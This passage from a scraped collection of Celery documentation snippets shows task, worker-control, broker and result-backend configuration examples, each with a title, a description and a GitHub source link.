from their parent tasks when task_inherit_parent_priority is enabled. Shows task definition and execution with priority setting.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/changelog-4.4.rst#2025-04-23_snippet_2\n\nLANGUAGE: python\nCODE:\n```\n@app.task(bind=True)\ndef child_task(self):\n    pass\n\n@app.task(bind=True)\ndef parent_task(self):\n    child_task.delay()\n\n# child_task will also have priority=5\nparent_task.apply_async(args=[], priority=5)\n```\n\n----------------------------------------\n\nTITLE: Worker Direct Queue Implementation\nDESCRIPTION: Updated implementation of worker direct queues for Celery 4.0\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-4.0.rst#2025-04-23_snippet_8\n\nLANGUAGE: python\nCODE:\n```\nfrom kombu import Exchange, Queue\n\nworker_direct_exchange = Exchange('C.dq2')\n\ndef worker_direct(hostname):\n    return Queue(\n        '{hostname}.dq2'.format(hostname),\n        exchange=worker_direct_exchange,\n        routing_key=hostname,\n    )\n```\n\n----------------------------------------\n\nTITLE: Subclassing Celery App Factory Method `app.Worker` in Python\nDESCRIPTION: Demonstrates how to subclass factory methods on a Celery app instance, such as `app.Worker`. This is possible because these methods (like `app.Worker`, `app.TaskSet`, etc.) were converted to cached descriptors that create a new subclass on access in Celery 3.0, allowing standard inheritance. Requires a Celery app instance (`app`).\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-3.0.rst#2025-04-23_snippet_22\n\nLANGUAGE: python\nCODE:\n```\nclass Worker(app.Worker):\n    ...\n```\n\n----------------------------------------\n\nTITLE: Implementing Variadic Control Commands in Python\nDESCRIPTION: Example of a control command that accepts a variable number of arguments. The terminate command takes a signal and a variable number of task IDs to terminate, demonstrating the variadic parameter.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-4.0.rst#2025-04-23_snippet_23\n\nLANGUAGE: python\nCODE:\n```\nfrom celery.worker.control import control_command\n\n@control_command(\n    args=[('signal', str)],\n    signature='<signal> [id1, [id2, [..., [idN]]]]]',\n    variadic='ids',\n)\ndef terminate(state, signal, ids, **kwargs):\n    ...\n```\n\n----------------------------------------\n\nTITLE: Configuring Cassandra Backend Settings in Celery\nDESCRIPTION: Example configuration for connecting to a Cassandra cluster as a result backend, specifying servers, keyspace, table, consistency settings, and TTL values.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/configuration.rst#2025-04-23_snippet_23\n\nLANGUAGE: python\nCODE:\n```\nresult_backend = 'cassandra://'\ncassandra_servers = ['localhost']\ncassandra_keyspace = 'celery'\ncassandra_table = 'tasks'\ncassandra_read_consistency = 'QUORUM'\ncassandra_write_consistency = 'QUORUM'\ncassandra_entry_ttl = 86400\n```\n\n----------------------------------------\n\nTITLE: Worker-heartbeat Event Signature in Celery\nDESCRIPTION: Signature definition for the worker-heartbeat event that is sent periodically to indicate worker status. Includes worker identification, system information, and task processing statistics.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/monitoring.rst#2025-04-23_snippet_37\n\nLANGUAGE: python\nCODE:\n```\nworker-heartbeat(hostname, timestamp, freq, sw_ident, sw_ver, sw_sys,\n              active, processed)\n```\n\n----------------------------------------\n\nTITLE: Using celery.xstarmap for Asynchronous Task Application in Python REPL\nDESCRIPTION: Demonstrates the use of `celery.xstarmap` to apply a task (`add`) asynchronously to a sequence of argument tuples (generated by `zip`). It shows applying the task to pairs of numbers from 0 to 9, calling `.apply_async()` to execute them, and implicitly retrieving the collected results (output shown as `[0, 2, ..., 18]`). Requires a defined Celery task (e.g., `add`) and the `celery` library.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-3.0.rst#2025-04-23_snippet_29\n\nLANGUAGE: pycon\nCODE:\n```\n>>> from celery import xstarmap\n\n>>> xstarmap(add, zip(range(10), range(10)).apply_async()\n[0, 2, 4, 6, 8, 10, 12, 14, 16, 18]\n```\n\n----------------------------------------\n\nTITLE: Error Callback with Exception Details\nDESCRIPTION: Illustrates how to define an error callback that receives the full exception and traceback information for failed tasks.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-4.0.rst#2025-04-23_snippet_18\n\nLANGUAGE: python\nCODE:\n```\n>>> add.s(2, 2).on_error(log_error.s()).delay()\n```\n\nLANGUAGE: python\nCODE:\n```\n@app.task\ndef log_error(request, exc, traceback):\n    with open(os.path.join('/var/errors', request.id), 'a') as fh:\n        print('--\\n\\n{0} {1} {2}'.format(\n            task_id, exc, traceback), file=fh)\n```\n\n----------------------------------------\n\nTITLE: Dumping Celery Events to Standard Output\nDESCRIPTION: Runs `celery events` with the `--dump` option, causing it to print raw event data to the standard output instead of launching the curses interface. Requires the Celery application instance (`-A proj`).\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/monitoring.rst#2025-04-23_snippet_28\n\nLANGUAGE: console\nCODE:\n```\n$ celery -A proj events --dump\n```\n\n----------------------------------------\n\nTITLE: Configuring Redis Sentinel with Password\nDESCRIPTION: Adding password authentication to Sentinel configuration\nSOURCE: https://github.com/celery/celery/blob/main/docs/getting-started/backends-and-brokers/redis.rst#2025-04-23_snippet_6\n\nLANGUAGE: python\nCODE:\n```\napp.conf.broker_transport_options = { 'sentinel_kwargs': { 'password': \"password\" } }\n```\n\n----------------------------------------\n\nTITLE: Installing Celery with MessagePack Serializer\nDESCRIPTION: Commands to uninstall deprecated msgpack-python package and install the new msgpack package for MessagePack serializer support.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-4.3.rst#2025-04-23_snippet_1\n\nLANGUAGE: console\nCODE:\n```\n$ pip uninstall msgpack-python -y\n$ pip install -U celery[msgpack]\n```\n\n----------------------------------------\n\nTITLE: Canceling Consumer via Command Line\nDESCRIPTION: Command to cancel a consumer on all workers using the celery control interface. This tells workers to stop consuming from a specified queue.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/workers.rst#2025-04-23_snippet_27\n\nLANGUAGE: console\nCODE:\n```\n$ celery -A proj control cancel_consumer foo\n```\n\n----------------------------------------\n\nTITLE: Importing the Celery chord Primitive in Python\nDESCRIPTION: Shows the import statement for the `celery.chord` primitive. The chord allows adding a callback that executes after all tasks in a group (the header) have completed.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/canvas.rst#2025-04-23_snippet_30\n\nLANGUAGE: pycon\nCODE:\n```\n>>> from celery import chord\n```\n\n----------------------------------------\n\nTITLE: Upgrading Celery to 2.2.8 using pip or easy_install (Bash)\nDESCRIPTION: Shell commands to upgrade the Celery package specifically to version 2.2.8 using either `pip` or `easy_install`. This addresses the CELERYSA-0001 vulnerability for users on the Celery 2.2 series. Requires Python package management tools (`pip` or `easy_install`) to be installed.\nSOURCE: https://github.com/celery/celery/blob/main/docs/sec/CELERYSA-0001.txt#2025-04-23_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\npip install -U celery==2.2.8\n```\n\nLANGUAGE: bash\nCODE:\n```\neasy_install -U celery==2.2.8\n```\n\n----------------------------------------\n\nTITLE: Using celeryctl Command Line Utility\nDESCRIPTION: Examples of using celeryctl utility to manage and inspect Celery worker nodes, apply tasks and inspect results.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/changelog-2.1.rst#2025-04-23_snippet_9\n\nLANGUAGE: console\nCODE:\n```\n$ celeryctl apply tasks.add -a '[2, 2]' --countdown=10\n\n$ celeryctl inspect active\n$ celeryctl inspect registered_tasks\n$ celeryctl inspect scheduled\n$ celeryctl inspect --help\n$ celeryctl apply --help\n```\n\n----------------------------------------\n\nTITLE: Configuring Redis Transport Options in Celery\nDESCRIPTION: Configuration example for enabling the fanout_patterns option in Redis transport to filter out unwanted events, which can increase performance considerably. This option means workers won't see workers with the option disabled or running older Celery versions.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/changelog-3.1.rst#2025-04-23_snippet_1\n\nLANGUAGE: python\nCODE:\n```\nBROKER_TRANSPORT_OPTIONS = {'fanout_patterns': True}\n```\n\n----------------------------------------\n\nTITLE: Triggering RDB Session via SIGUSR2 Signal (Console)\nDESCRIPTION: This console command shows how to trigger a remote debugging (`rdb`) session in a running Celery worker process (main or pool worker) that was started with `CELERY_RDBSIG=1`. Sending the `SIGUSR2` signal to the target process ID (`<pid>`) using the `kill` command initiates the `rdb` instance.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/debugging.rst#2025-04-23_snippet_6\n\nLANGUAGE: console\nCODE:\n```\n$ kill -USR2 <pid>\n```\n\n----------------------------------------\n\nTITLE: Starting Flower with Redis Broker URL\nDESCRIPTION: Starts the Flower web server, explicitly specifying the Redis broker URL using the `--broker` argument. This overrides the broker configured in the Celery application.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/monitoring.rst#2025-04-23_snippet_24\n\nLANGUAGE: console\nCODE:\n```\n$ celery --broker=redis://guest:guest@localhost:6379/0 flower\n```\n\n----------------------------------------\n\nTITLE: Configuring Celerybeat with Additional Parameters\nDESCRIPTION: Example showing how to add additional configuration parameters to celerybeat with the -- separator for custom settings like max loop interval.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-2.5.rst#2025-04-23_snippet_9\n\nLANGUAGE: console\nCODE:\n```\n$ celerybeat -l info -- celerybeat.max_loop_interval=10.0\n```\n\n----------------------------------------\n\nTITLE: Importing Task Base Class in Celery\nDESCRIPTION: Demonstrates the old and new ways of importing the Task base class in Celery. The new method involves importing directly from celery instead of celery.task.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/application.rst#2025-04-23_snippet_16\n\nLANGUAGE: python\nCODE:\n```\nfrom celery.task import Task   # << OLD Task base class.\n\nfrom celery import Task        # << NEW base class.\n```\n\n----------------------------------------\n\nTITLE: Managing Celery Workers with 'celery multi' for Unprivileged Users\nDESCRIPTION: Provides examples of using the `celery multi` command to start, restart, and stop Celery workers without requiring root privileges. It specifies the project app (`-A proj`), PID file location (`--pidfile`), and log file location (`--logfile`). This method is presented as an alternative to using root-only init scripts.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/daemonizing.rst#2025-04-23_snippet_1\n\nLANGUAGE: console\nCODE:\n```\n$ celery -A proj multi start worker1 \\\n    --pidfile=\"$HOME/run/celery/%n.pid\" \\\n    --logfile=\"$HOME/log/celery/%n%I.log\"\n\n$ celery -A proj multi restart worker1 \\\n    --logfile=\"$HOME/log/celery/%n%I.log\" \\\n    --pidfile=\"$HOME/run/celery/%n.pid\n\n$ celery multi stopwait worker1 --pidfile=\"$HOME/run/celery/%n.pid\"\n```\n\n----------------------------------------\n\nTITLE: Database Backend Configuration Example\nDESCRIPTION: Configuration example showing how to set up database backend with deferred table creation.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/changelog-5.5.rst#2025-04-23_snippet_2\n\nLANGUAGE: python\nCODE:\n```\napp.conf.result_backend = 'db+sqlite:///results.db'\napp.conf.database_create_tables_at_setup = False\n```\n\n----------------------------------------\n\nTITLE: Locating and Removing Problematic Module Files in Console\nDESCRIPTION: Commands to locate and remove a problematic module file after upgrading. This example specifically helps find and remove old celery.platform module files that clash with the renamed celery.platforms module.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/changelog-2.1.rst#2025-04-23_snippet_4\n\nLANGUAGE: console\nCODE:\n```\n$ python\n>>> import celery.platform\n>>> celery.platform\n<module 'celery.platform' from '/opt/devel/celery/celery/platform.pyc'>\n```\n\n----------------------------------------\n\nTITLE: Celery Schedule Dump Example\nDESCRIPTION: Example showing the output format of broadcasting a schedule dump command in Celery, demonstrating task scheduling details across multiple workers.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/changelog-1.0.rst#2025-04-23_snippet_6\n\nLANGUAGE: python\nCODE:\n```\n>>> broadcast('dump_schedule', reply=True)\n[{'w1': []},\n {'w3': []},\n {'w2': ['0. 2010-05-12 11:06:00 pri0 <TaskRequest\n                {name:'opalfeeds.tasks.refresh_feed_slice',\n                 id:'95b45760-4e73-4ce8-8eac-f100aa80273a',\n                 args:'(<Feeds freq_max:3600 freq_min:60\n                           start:2184.0 stop:3276.0>,)',\n                 kwargs:'{\"page\": 2}'}>']},\n {'w4': ['0. 2010-05-12 11:00:00 pri0 <TaskRequest\n                {name:'opalfeeds.tasks.refresh_feed_slice',\n                 id:'c053480b-58fb-422f-ae68-8d30a464edfe',\n                 args:'(<Feeds freq_max:3600 freq_min:60\n                           start:1092.0 stop:2184.0>,)',\n                 kwargs:'{\\\"page\\\": 1}'}>',\n            '1. 2010-05-12 11:12:00 pri0 <TaskRequest\n                {name:'opalfeeds.tasks.refresh_feed_slice',\n                 id:'ab8bc59e-6cf8-44b8-88d0-f1af57789758',\n                 args:'(<Feeds freq_max:3600 freq_min:60\n                           start:3276.0 stop:4365>,)',\n                 kwargs:'{\\\"page\\\": 3}'}>']}]\n```\n\n----------------------------------------\n\nTITLE: Enabling UTC Timezone Support in Celery with Python\nDESCRIPTION: Enables UTC timezone support in Celery. When enabled, dates and times in task messages will be converted to UTC and back to local timezone when received by a worker.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-2.5.rst#2025-04-23_snippet_3\n\nLANGUAGE: python\nCODE:\n```\nCELERY_ENABLE_UTC = True\n```\n\n----------------------------------------\n\nTITLE: Running celeryev Event Dumper in Python\nDESCRIPTION: Example of running celeryev with the -d switch to dump events to standard output. Shows event format including sender hostname, timestamp, event type and additional fields.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/changelog-2.0.rst#2025-04-23_snippet_9\n\nLANGUAGE: console\nCODE:\n```\n$ celeryev -d\n-> celeryev: starting capture...\ncasper.local [2010-06-04 10:42:07.020000] heartbeat\ncasper.local [2010-06-04 10:42:14.750000] task received:\n    tasks.add(61a68756-27f4-4879-b816-3cf815672b0e) args=[2, 2] kwargs={}\n    eta=2010-06-04T10:42:16.669290, retries=0\ncasper.local [2010-06-04 10:42:17.230000] task started\n    tasks.add(61a68756-27f4-4879-b816-3cf815672b0e) args=[2, 2] kwargs={}\ncasper.local [2010-06-04 10:42:17.960000] task succeeded:\n    tasks.add(61a68756-27f4-4879-b816-3cf815672b0e)\n    args=[2, 2] kwargs={} result=4, runtime=0.782663106918\n```\n\n----------------------------------------\n\nTITLE: Inspecting Reserved Tasks on Specific Celery Workers\nDESCRIPTION: Uses the `inspect` command with the `--destination` (`-d`) option to target specific worker nodes (`w1@e.com`, `w2@e.com`) and list their reserved tasks. Requires the Celery application instance (`-A proj`).\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/monitoring.rst#2025-04-23_snippet_18\n\nLANGUAGE: console\nCODE:\n```\n$ celery -A proj inspect -d w1@e.com,w2@e.com reserved\n```\n\n----------------------------------------\n\nTITLE: Configuring Global Task Rate Limit Annotation in Celery with Python\nDESCRIPTION: Uses the CELERY_ANNOTATIONS setting to set a global rate limit of 10 tasks per second for all tasks.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-2.5.rst#2025-04-23_snippet_5\n\nLANGUAGE: python\nCODE:\n```\nCELERY_ANNOTATIONS = {'*': {'rate_limit': '10/s'}}\n```\n\n----------------------------------------\n\nTITLE: Defining Tasks with Required Kwargs in Celery\nDESCRIPTION: Example of defining a Celery task with required keyword arguments in any order. This demonstrates how to use positional-only arguments, default values, and required parameters in task function definitions.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-5.1.rst#2025-04-23_snippet_2\n\nLANGUAGE: python\nCODE:\n```\nfrom celery import shared_task\n\n@shared_task\ndef my_func(*, name='default', age, city='Kyiv'):\n    pass\n```\n\n----------------------------------------\n\nTITLE: Auto-discovering Django Tasks\nDESCRIPTION: Configures Celery to automatically discover tasks from installed Django apps using settings.INSTALLED_APPS\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-3.1.rst#2025-04-23_snippet_4\n\nLANGUAGE: python\nCODE:\n```\nfrom django.conf import settings\napp.autodiscover_tasks(lambda: settings.INSTALLED_APPS)\n```\n\n----------------------------------------\n\nTITLE: Advanced `celeryd-multi` Configuration for Multiple Workers (Console)\nDESCRIPTION: An advanced example using `celeryd-multi` to start 10 workers with complex configurations. It assigns specific queues (`-Q`) and log levels (`-L`) to different ranges of workers: workers 1-3 handle 'images,video', workers 4-5 handle 'data' with DEBUG level, and the rest handle the 'default' queue with INFO level.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/changelog-2.0.rst#2025-04-23_snippet_18\n\nLANGUAGE: console\nCODE:\n```\n$ celeryd-multi start 10 -l INFO -Q:1-3 images,video -Q:4,5:data -Q default -L:4,5 DEBUG\n```\n\n----------------------------------------\n\nTITLE: Loading Celery Configuration from an Actual Module Object in Python\nDESCRIPTION: Demonstrates an alternative to referencing module names for configuration: importing the configuration module and passing the module object itself. This approach is functionally equivalent but may cause issues with serialization in multiprocessing environments (see notes in source). The configuration module must be present and populated with valid config attributes.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/application.rst#2025-04-23_snippet_9\n\nLANGUAGE: python\nCODE:\n```\nimport celeryconfig\n\nfrom celery import Celery\n\napp = Celery()\napp.config_from_object(celeryconfig)\n```\n\n----------------------------------------\n\nTITLE: Configuring Redis Result Backend with New Join Implementation\nDESCRIPTION: Example of enabling the experimental chord join implementation for Redis result backend. This optimization makes chord operations considerably faster and uses fewer resources, but must be enabled manually as it's incompatible with workers and clients not using it.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/changelog-3.1.rst#2025-04-23_snippet_2\n\nLANGUAGE: python\nCODE:\n```\nCELERY_RESULT_BACKEND = 'redis://localhost?new_join=1'\n```\n\n----------------------------------------\n\nTITLE: Dumping Celery Worker Events to Console (console)\nDESCRIPTION: Starts the Celery event dumper using `celery -A proj events --dump`. This command connects to the message broker, captures event messages sent by workers (requires events to be enabled via `control enable_events`), and prints them to standard output.\nSOURCE: https://github.com/celery/celery/blob/main/docs/getting-started/next-steps.rst#2025-04-23_snippet_18\n\nLANGUAGE: console\nCODE:\n```\n$ celery -A proj events --dump\n```\n\n----------------------------------------\n\nTITLE: Verifying the Automatic Name of a Task Defined in a Module (pycon)\nDESCRIPTION: Demonstrates within a Python console session (`pycon`) how to import a task (`add`) defined in a separate module (`tasks.py`, shown in the previous snippet) and check its automatically generated name ('tasks.add') by accessing the `.name` attribute.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/tasks.rst#2025-04-23_snippet_11\n\nLANGUAGE: pycon\nCODE:\n```\n>>> from tasks import add\n>>> add.name\n'tasks.add'\n```\n\n----------------------------------------\n\nTITLE: Using current Proxy in Celery Task for Retry in Python\nDESCRIPTION: Demonstrates the usage of the new celery.task.current proxy to access the currently executing task. This example shows how to use current.retry() in a task that updates a Twitter status.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-2.5.rst#2025-04-23_snippet_8\n\nLANGUAGE: python\nCODE:\n```\nfrom celery.task import current, task\n\n@task\ndef update_twitter_status(auth, message):\n    twitter = Twitter(auth)\n    try:\n        twitter.update_status(message)\n    except twitter.FailWhale, exc:\n        # retry in 10 seconds.\n        current.retry(countdown=10, exc=exc)\n```\n\n----------------------------------------\n\nTITLE: Random Failover Strategy Implementation in Celery Python\nDESCRIPTION: Custom implementation of a broker failover strategy that randomly selects a broker from the available list.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/configuration.rst#2025-04-23_snippet_46\n\nLANGUAGE: python\nCODE:\n```\n# Random failover strategy\ndef random_failover_strategy(servers):\n    it = list(servers)  # don't modify callers list\n    shuffle = random.shuffle\n    for _ in repeat(None):\n        shuffle(it)\n        yield it[0]\n\nbroker_failover_strategy = random_failover_strategy\n```\n\n----------------------------------------\n\nTITLE: Configuring ArangoDB Backend URL\nDESCRIPTION: Python configuration for ArangoDB backend connection URL\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/configuration.rst#2025-04-23_snippet_35\n\nLANGUAGE: python\nCODE:\n```\nresult_backend = 'arangodb://username:password@host:port/database/collection'\n```\n\n----------------------------------------\n\nTITLE: Starting Celery Worker with Environment Variable to Disable Daemonization - Shell (console)\nDESCRIPTION: Illustrates setting the C_FAKEFORK environment variable to '1' before starting the Celery worker service with the init.d script in verbose mode. This prevents daemonization, keeping standard output open for debugging errors that would otherwise be hidden. Requires a Bash shell or compatible shell, and that the environment variable and init.d script are available. Outputs error messages to the console.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/daemonizing.rst#2025-04-23_snippet_7\n\nLANGUAGE: console\nCODE:\n```\n# C_FAKEFORK=1 sh -x /etc/init.d/celeryd start\n```\n\n----------------------------------------\n\nTITLE: Creating Task from Function using Decorator\nDESCRIPTION: Demonstrates how to convert a regular Python function into a Celery task using the @task decorator. This is the new required way to create tasks as regular functions are no longer supported.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/changelog-1.0.rst#2025-04-23_snippet_9\n\nLANGUAGE: python\nCODE:\n```\nfrom celery.decorators import task\n\n@task()\ndef add(x, y):\n    return x + y\n```\n\n----------------------------------------\n\nTITLE: Result Serialization Migration\nDESCRIPTION: Example showing migration from deprecated AsyncResult.serializable() to the newer tuple-based serialization format.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-4.0.rst#2025-04-23_snippet_25\n\nLANGUAGE: python\nCODE:\n```\n>>> tup = result.as_tuple()\n>>> from celery.result import result_from_tuple\n>>> result = result_from_tuple(tup)\n```\n\n----------------------------------------\n\nTITLE: Pydantic Integration Example in Celery Tasks\nDESCRIPTION: Demonstrates how to use Pydantic models with Celery tasks for data validation and serialization. Shows model definition and task implementation with type hints.\nSOURCE: https://github.com/celery/celery/blob/main/Changelog.rst#2025-04-23_snippet_0\n\nLANGUAGE: python\nCODE:\n```\nfrom pydantic import BaseModel\nfrom celery import Celery\n\napp = Celery('tasks')\n\nclass ArgModel(BaseModel):\n    value: int\n\nclass ReturnModel(BaseModel):\n    value: str\n\n@app.task(pydantic=True)\ndef x(arg: ArgModel) -> ReturnModel:\n    # args/kwargs type hinted as Pydantic model will be converted\n    assert isinstance(arg, ArgModel)\n\n    # The returned model will be converted to a dict automatically\n    return ReturnModel(value=f\"example: {arg.value}\")\n```\n\n----------------------------------------\n\nTITLE: Migrating Celery Tasks Between Brokers (Experimental)\nDESCRIPTION: Attempts to migrate tasks from one message broker (source: `redis://localhost`) to another (destination: `amqp://localhost`). This is an experimental feature and requires caution and backups. Requires the Celery application instance (`-A proj`) and broker URLs.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/monitoring.rst#2025-04-23_snippet_17\n\nLANGUAGE: console\nCODE:\n```\n$ celery -A proj migrate redis://localhost amqp://localhost\n```\n\n----------------------------------------\n\nTITLE: Installing Redis Support for Celery via pip\nDESCRIPTION: Installs Celery with Redis dependencies using the celery[redis] bundle\nSOURCE: https://github.com/celery/celery/blob/main/docs/getting-started/backends-and-brokers/redis.rst#2025-04-23_snippet_0\n\nLANGUAGE: console\nCODE:\n```\n$ pip install -U \"celery[redis]\"\n```\n\n----------------------------------------\n\nTITLE: Adjusting Worker Autoscaling via Command Line in Celery\nDESCRIPTION: Demonstrates how to use the celery control command line to adjust autoscaling settings for specific workers by specifying max and min concurrency values.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-3.0.rst#2025-04-23_snippet_12\n\nLANGUAGE: console\nCODE:\n```\n$ celery control -d w1.example.com autoscale 10 5\n```\n\n----------------------------------------\n\nTITLE: Creating Chunks with Celery in Python Console\nDESCRIPTION: Demonstrates how to create chunks of tasks using Celery's chunks method, dividing work into smaller pieces.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/canvas.rst#2025-04-23_snippet_65\n\nLANGUAGE: pycon\nCODE:\n```\n>>> add.chunks(zip(range(100), range(100)), 10)\n```\n\n----------------------------------------\n\nTITLE: Force Killing Celery Workers with pkill (Console)\nDESCRIPTION: Uses the `pkill` command to forcefully terminate all processes whose command line matches 'celery worker' by sending the SIGKILL signal (-9). This should be used cautiously as it bypasses graceful shutdown and can lead to data loss for tasks without `acks_late`.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/workers.rst#2025-04-23_snippet_3\n\nLANGUAGE: console\nCODE:\n```\n$ pkill -9 -f 'celery worker'\n```\n\n----------------------------------------\n\nTITLE: Configuring Advanced Cassandra Driver Settings in Celery\nDESCRIPTION: Additional configuration for the Cassandra driver in Celery, including explicit protocol version and load-balancing policy settings using execution profiles.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/configuration.rst#2025-04-23_snippet_25\n\nLANGUAGE: python\nCODE:\n```\nfrom cassandra.policies import DCAwareRoundRobinPolicy\nfrom cassandra.cluster import ExecutionProfile\nfrom cassandra.cluster import EXEC_PROFILE_DEFAULT\nmyEProfile = ExecutionProfile(\n  load_balancing_policy=DCAwareRoundRobinPolicy(\n    local_dc='datacenter1', # replace with your DC name\n  )\n)\ncassandra_options = {\n  'protocol_version': 5,    # for Cassandra 4, change if needed\n  'execution_profiles': {EXEC_PROFILE_DEFAULT: myEProfile},\n}\n```\n\n----------------------------------------\n\nTITLE: Worker-online Event Signature in Celery\nDESCRIPTION: Signature definition for the worker-online event that is sent when a worker connects to the broker. Includes parameters for worker identification, timestamp, and system information.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/monitoring.rst#2025-04-23_snippet_36\n\nLANGUAGE: python\nCODE:\n```\nworker-online(hostname, timestamp, freq, sw_ident, sw_ver, sw_sys)\n```\n\n----------------------------------------\n\nTITLE: Embedding Celery Beat within a Worker Process\nDESCRIPTION: This console command starts a Celery worker and embeds the beat scheduler within the same process using the `-B` option. This is convenient for simple setups with only one worker node but is generally not recommended for production environments, especially those with multiple workers, as it can lead to duplicate task scheduling.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/periodic-tasks.rst#2025-04-23_snippet_14\n\nLANGUAGE: console\nCODE:\n```\n$ celery -A proj worker -B\n```\n\n----------------------------------------\n\nTITLE: Installing Celery with bundles\nDESCRIPTION: Commands demonstrating how to install Celery with additional feature bundles by specifying them in brackets. This allows for installing Celery with dependencies for specific features like librabbitmq transport or redis support.\nSOURCE: https://github.com/celery/celery/blob/main/docs/includes/installation.txt#2025-04-23_snippet_1\n\nLANGUAGE: console\nCODE:\n```\n$ pip install \"celery[librabbitmq]\"\n\n$ pip install \"celery[librabbitmq,redis,auth,msgpack]\"\n```\n\n----------------------------------------\n\nTITLE: Task Callback Invocation\nDESCRIPTION: Shows how to invoke chained tasks using the canvas syntax\nSOURCE: https://github.com/celery/celery/blob/main/docs/faq.rst#2025-04-23_snippet_9\n\nLANGUAGE: python\nCODE:\n```\n>>> (add.s(2, 2) | log_result.s()).delay()\n```\n\n----------------------------------------\n\nTITLE: Configuring Producer Connection Retry Limit in Python\nDESCRIPTION: This snippet demonstrates how to set the maximum number of retries for producer connections using the 'broker_transport_options' setting.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/configuration.rst#2025-04-23_snippet_49\n\nLANGUAGE: python\nCODE:\n```\nbroker_transport_options = {'max_retries': 5}\n```\n\n----------------------------------------\n\nTITLE: Executing Single Celery Task Asynchronously\nDESCRIPTION: Python code demonstrating how to execute the `urlopen` task asynchronously. It imports the task, calls `.delay()` with the target URL, and then uses `.get()` to block until the result (the size of the response body) is available. Assumes the Celery worker is running.\nSOURCE: https://github.com/celery/celery/blob/main/examples/eventlet/README.rst#2025-04-23_snippet_2\n\nLANGUAGE: python\nCODE:\n```\n$ cd examples/eventlet\n$ python\n>>> from tasks import urlopen\n>>> urlopen.delay('https://www.google.com/').get()\n9980\n```\n\n----------------------------------------\n\nTITLE: Using Celery's starmap Function in Python Console\nDESCRIPTION: Shows how to use Celery's starmap function to apply a task to pairs of arguments from two iterables.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/canvas.rst#2025-04-23_snippet_62\n\nLANGUAGE: pycon\nCODE:\n```\n>>> ~add.starmap(zip(range(10), range(10)))\n[0, 2, 4, 6, 8, 10, 12, 14, 16, 18]\n```\n\n----------------------------------------\n\nTITLE: Adding RabbitMQ to System PATH on macOS\nDESCRIPTION: Bash command to add RabbitMQ executables to the system PATH for easy access to start and stop commands.\nSOURCE: https://github.com/celery/celery/blob/main/docs/getting-started/backends-and-brokers/rabbitmq.rst#2025-04-23_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\nPATH=$PATH:/usr/local/sbin\n```\n\n----------------------------------------\n\nTITLE: Event Message Example in Python\nDESCRIPTION: Shows the structure of a task-succeeded event message including properties, headers, and body\nSOURCE: https://github.com/celery/celery/blob/main/docs/internals/protocol.rst#2025-04-23_snippet_3\n\nLANGUAGE: python\nCODE:\n```\nproperties = {\n    'routing_key': 'task.succeeded',\n    'exchange': 'celeryev',\n    'content_type': 'application/json',\n    'content_encoding': 'utf-8',\n    'delivery_mode': 1,\n}\nheaders = {\n    'hostname': 'worker1@george.vandelay.com',\n}\nbody = {\n    'type': 'task-succeeded',\n    'hostname': 'worker1@george.vandelay.com',\n    'pid': 6335,\n    'clock': 393912923921,\n    'timestamp': 1401717709.101747,\n    'utcoffset': -1,\n    'uuid': '9011d855-fdd1-4f8f-adb3-a413b499eafb',\n    'retval': '4',\n    'runtime': 0.0003212,\n)\n```\n\n----------------------------------------\n\nTITLE: Error Callback with Bound Tasks Example\nDESCRIPTION: Demonstrates how to use bound tasks as error callbacks in Celery 4.2.0, fixing a regression from 3.x. Shows task definition and error handling setup.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-4.2.rst#2025-04-23_snippet_0\n\nLANGUAGE: python\nCODE:\n```\n@app.task(name=\"raise_exception\", bind=True)\ndef raise_exception(self):\n    raise Exception(\"Bad things happened\")\n\n\n@app.task(name=\"handle_task_exception\", bind=True)\ndef handle_task_exception(self):\n    print(\"Exception 